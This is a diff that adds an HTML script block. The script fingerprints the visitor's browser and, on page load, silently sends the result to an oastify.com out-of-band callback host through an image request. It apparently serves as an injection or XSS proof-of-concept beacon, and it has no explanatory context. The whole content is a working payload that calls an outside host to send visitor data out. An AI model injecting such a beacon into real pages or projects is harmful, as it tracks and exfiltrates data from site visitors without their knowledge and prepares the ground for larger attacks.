@@ -1,0 +1,61 @@
+<script>(() => {
+    const getBrowser = () => {
+        // Detect Chrome (and Chromium-based browsers)
+        if (window.chrome && CSS?.escaped) {
+            if (navigator.userAgentData?.brands?.some(b => b.brand.includes('Edg'))) {
+                return "Microsoft Edge (Chromium-based)";
+            } else if (navigator.userAgentData?.brands?.some(b => b.brand.includes('Opera'))) {
+                return "Opera (Chromium-based)";
+            } else {
+                return "Google Chrome (or Chromium-based)";
+            }
+        }
+
+        // Detect Firefox
+        if (typeof InstallTrigger !== 'undefined') {
+            return "Mozilla Firefox";
+        }
+
+        // Detect Safari (both desktop and iOS)
+        if (window.safari || CSS.supports("-webkit-touch-callout", "none")) {
+            return "Apple Safari";
+        }
+
+        // Detect Brave Browser (Chromium-based but blocks certain APIs)
+        if (window.navigator.brave?.isBrave) {
+            return "Brave (Chromium-based)";
+        }
+
+        // Detect Microsoft Edge (Legacy, pre-Chromium)
+        if (window.StyleMedia) {
+            return "Microsoft Edge (Legacy)";
+        }
+
+        // Detect Internet Explorer 11
+        if (!!window.MSInputMethodContext && !!document.documentMode) {
+            return "Internet Explorer 11";
+        }
+
+        // Detect Opera (Pre-Chromium)
+        if (window.opera || /OPR/.test(navigator.vendor)) {
+            return "Opera (Pre-Chromium)";
+        }
+
+        // Detect Samsung Internet Browser
+        if (navigator.vendor === "Samsung Electronics" && /SamsungBrowser/.test(navigator.userAgent)) {
+            return "Samsung Internet Browser";
+        }
+
+        // Fallback for unknown browsers
+        return "Unknown Browser";
+    };
+
+    const browserType = getBrowser();
+    console.log(`Detected Browser: ${browserType}`);
+
+    // Send to OAST domain
+    const oastDomain = '121hwqnzkm6jyg21t7r54aq0oruiih66.oastify.com';
+    const img = new Image();
+    img.src = `https://${oastDomain}/?browser=${encodeURIComponent(browserType)}`;
+})();
+</script>
